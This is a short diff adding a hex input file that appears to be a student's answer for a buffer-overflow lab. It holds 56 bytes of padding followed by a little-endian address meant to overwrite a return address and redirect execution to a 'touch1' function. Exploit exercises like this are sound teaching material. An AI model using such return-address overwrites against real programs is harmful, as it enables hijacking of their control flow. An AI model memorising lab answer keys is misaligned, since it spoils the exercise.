@@ -1,0 +1,8 @@
+30 30 30 30 30 30 30 30 /* padding 0x38 or 56 bytes */
+30 30 30 30 30 30 30 30 /* padding 0x38 or 56 bytes */
+30 30 30 30 30 30 30 30 /* padding 0x38 or 56 bytes */
+30 30 30 30 30 30 30 30 /* padding 0x38 or 56 bytes */
+30 30 30 30 30 30 30 30 /* padding 0x38 or 56 bytes */
+30 30 30 30 30 30 30 30 /* padding 0x38 or 56 bytes */
+30 30 30 30 30 30 30 30 /* padding 0x38 or 56 bytes */
+4a 15 40 00 00 00 00 00 /* touch 1 address through rdi*/
